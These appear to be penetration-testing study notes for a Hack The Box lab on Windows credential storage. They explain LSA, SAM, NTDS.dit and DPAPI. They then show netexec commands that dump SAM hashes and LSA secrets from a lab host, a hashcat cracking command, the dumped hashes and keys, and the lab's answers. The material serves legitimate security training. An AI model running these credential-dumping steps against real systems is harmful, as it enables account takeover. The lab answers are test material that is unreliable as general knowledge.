
## Windows Authentication Process


### Windows Authentication Process Diagram

![Windows Authentication Process Diagram](content/Penetration%20Testing/HTB/Password%20Attacks/Extracting%20Passwords/From%20WINDOWS/Attacking%20SAM%20SYSTEM%20SECURITY/Images/img1.png)

### LSA

- LSA stands for Local Security Authority.
- Authenticates local users, local logins and oversees all aspects of local security and provides services for translating between usernames and security identifiers(SIDs).
- Credentials are stored in `LSASS`, `SAM Database` or `Active Directory`.
- LSA is conceptual while LSASS is the actual implementation.

### LSASS

- Responsible for handling local security policy, authenticating users, and forwards security related events like logins, or failed logins etc. to `Event Log`.
- Located at `%SystemRoot%\System32\Lsass.exe`in the file system.

### WinLogon

- `WinLogon` handles the local logon process.
- The logon UI is handled by `logonUI`.

|**Authentication Packages**|**Description**|
|---|---|
|`Lsasrv.dll`|The LSA Server service both enforces security policies and acts as the security package manager for the LSA. The LSA contains the Negotiate function, which selects either the NTLM or Kerberos protocol after determining which protocol is to be successful.|
|`Msv1_0.dll`|Authentication package for local machine logons that don't require custom authentication.|
|`Samsrv.dll`|The Security Accounts Manager (SAM) stores local security accounts, enforces locally stored policies, and supports APIs.|
|`Kerberos.dll`|Security package loaded by the LSA for Kerberos-based authentication on a machine.|
|`Netlogon.dll`|Network-based logon service.|
|`Ntdsa.dll`|Directory System Agent (DSA) that manages the Active Directory database (ntds.dit), processes LDAP queries, and handles replication between domain controllers. Only loaded on Domain Controllers.|

### SAM Database

- Its a database in windows which stores user account credentials.
- It is used to authenticate both local and remote users and uses cryptographic protections to prevent unauthorized access.
- User passwords are stored as hashes in the registry, typically in the form of either `LM` or `NTLM` hashes.
- Located at `%SystemRoot%\system32\config\SAM` and is mounted under `HKLM\SAM`.

### NTDS

- `NTDS.dit` is a database file which stores Active Directory data. This data consists of the following stuff and more :-
	- user accounts (usernames and password hashes)
	- group accounts
	- computer accounts
	- group policy objects
- This `NTDS` is maintained by a Domain Controller in the Windows Domain network which is responsible to main authorization and authentication in this network. It controls the Active Directory forest. Each domain controller has a `NTDS.dit` file which is synchronized across all Domain Controllers. 

## Registry hives

There are three registry hives we can copy if we have local administrative access to a target system, each serving a specific purpose when it comes to dumping and cracking password hashes. A brief description of each is provided in the table below:

|Registry Hive|Description|
|---|---|
|`HKLM\SAM`|Contains password hashes for local user accounts. These hashes can be extracted and cracked to reveal plaintext passwords.|
|`HKLM\SYSTEM`|Stores the system boot key, which is used to encrypt the SAM database. This key is required to decrypt the hashes.|
|`HKLM\SECURITY`|Contains sensitive information used by the Local Security Authority (LSA), including cached domain credentials (DCC2), cleartext passwords, DPAPI keys, and more.|


## DCC2 hash

- local copies of network login hashes stored securely on a Windows computer.

## DPAPI

- DPAPI is a Windows mechanism built specifically to encrypt passwords and sensitive data safely.
- Below are just a few examples of applications that use DPAPI and how they use it:

|Applications|Use of DPAPI|
|---|---|
|`Internet Explorer`|Password form auto-completion data (username and password for saved sites).|
|`Google Chrome`|Password form auto-completion data (username and password for saved sites).|
|`Outlook`|Passwords for email accounts.|
|`Remote Desktop Connection`|Saved credentials for connections to remote machines.|
|`Credential Manager`|Saved credentials for accessing shared resources, joining Wireless networks, VPNs and more.|
- DPAPI encrypted credentials can be decrypted manually with tools like Impacket's [dpapi](https://github.com/fortra/impacket/blob/master/examples/dpapi.py), [mimikatz](https://github.com/gentilkiwi/mimikatz), or remotely with [DonPAPI](https://github.com/login-securite/DonPAPI).

---
## Questions and Solutions


- Where is the SAM database located in the Windows registry? (Format: ****\***)
	- **HKLM\SAM**


- Apply the concepts taught in this section to obtain the password to the ITbackdoor user account on the target. Submit the clear-text password as the answer.
	- **matrix**


Dumping SAM database hashes remotely using `Bob` credentials.

```bash
─$ netexec smb 10.129.202.137 --local-auth -u Bob -p 'HTB_@cademy_stdnt!' --sam
SMB         10.129.202.137  445    FRONTDESK01      [*] Windows 10 / Server 2019 Build 18362 x64 (name:FRONTDESK01) (domain:FRONTDESK01) (signing:False) (SMBv1:False) 
SMB         10.129.202.137  445    FRONTDESK01      [+] FRONTDESK01\Bob:HTB_@cademy_stdnt! (Pwn3d!)
SMB         10.129.202.137  445    FRONTDESK01      [*] Dumping SAM hashes
SMB         10.129.202.137  445    FRONTDESK01      Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.129.202.137  445    FRONTDESK01      Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.129.202.137  445    FRONTDESK01      DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.129.202.137  445    FRONTDESK01      WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:72639bbb94990305b5a015220f8de34e:::
SMB         10.129.202.137  445    FRONTDESK01      bob:1001:aad3b435b51404eeaad3b435b51404ee:3c0e5d303ec84884ad5c3b7876a06ea6:::
SMB         10.129.202.137  445    FRONTDESK01      jason:1002:aad3b435b51404eeaad3b435b51404ee:a3ecf31e65208382e23b3420a34208fc:::
SMB         10.129.202.137  445    FRONTDESK01      ITbackdoor:1003:aad3b435b51404eeaad3b435b51404ee:c02478537b9727d391bc80011c2e2321:::
SMB         10.129.202.137  445    FRONTDESK01      frontdesk:1004:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::
SMB         10.129.202.137  445    FRONTDESK01      [+] Added 8 SAM hashes to the database
```

Cracking the `ITbackdoor` password hash.

```bash
$ sudo hashcat -m 1000 ITbackdoor_hash /usr/share/wordlists/rockyou.txt
```


- Dump the LSA secrets on the target and discover the credentials stored. Submit the username and password as the answer. (Format: username:password, Case-Sensitive)
	- **frontdesk:Password123**


Dumping LSA secrets remotely using the `Bob` user credentials.

```bash
$ netexec smb 10.129.202.137 --local-auth -u Bob -p 'HTB_@cademy_stdnt!' --lsa

SMB         10.129.202.137  445    FRONTDESK01      [*] Windows 10 / Server 2019 Build 18362 x64 (name:FRONTDESK01) (domain:FRONTDESK01) (signing:False) (SMBv1:False) 
SMB         10.129.202.137  445    FRONTDESK01      [+] FRONTDESK01\Bob:HTB_@cademy_stdnt! (Pwn3d!)
SMB         10.129.202.137  445    FRONTDESK01      [+] Dumping LSA secrets
SMB         10.129.202.137  445    FRONTDESK01      dpapi_machinekey:0xc03a4a9b2c045e545543f3dcb9c181bb17d6bdce
dpapi_userkey:0x50b9fa0fd79452150111357308748f7ca101944a
SMB         10.129.202.137  445    FRONTDESK01      frontdesk:Password123
SMB         10.129.202.137  445    FRONTDESK01      [+] Dumped 2 LSA secrets to /home/kali/.nxc/logs/lsa/FRONTDESK01_10.129.202.137_2026-06-21_025125.secrets and /home/kali/.nxc/logs/lsa/FRONTDESK01_10.129.202.137_2026-06-21_025125.cached
```
